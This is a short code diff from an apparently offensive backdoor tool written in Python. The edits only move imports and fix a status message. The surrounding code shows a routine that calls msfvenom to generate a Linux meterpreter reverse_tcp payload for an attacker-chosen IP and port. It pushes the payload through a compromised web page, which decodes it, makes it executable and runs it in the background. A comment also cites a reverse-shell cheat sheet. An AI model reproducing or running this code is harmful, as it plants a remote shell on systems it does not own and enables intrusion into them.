@@ -6,10 +6,10 @@ from random import choice
 from itertools import product
 from base64 import b64encode
 
+from modules.shell_handler import linux
 from core.libs.menu import getargs
-from core.libs.termcolor import colored, cprint
 from core.libs.request_handler import make_request
-from core.modules.shell_handler import linux
+from core.libs.thirdparty.termcolor import cprint, colored
 
 
 # Source: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet (Thanks @pentestmonkey)
@@ -71,7 +71,7 @@ class Backdoor(object):
                 cprint('[i] Generating linux/x86/meterpreter/reverse_tcp', 'green')
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
-                cprint('{0}[+] Sending payload & executing', 'green')
+                cprint('[+] Sending payload & executing', 'green')
                 make_request.get_page_source(cmd)
                 cprint('[+] Done!', 'blue')
 
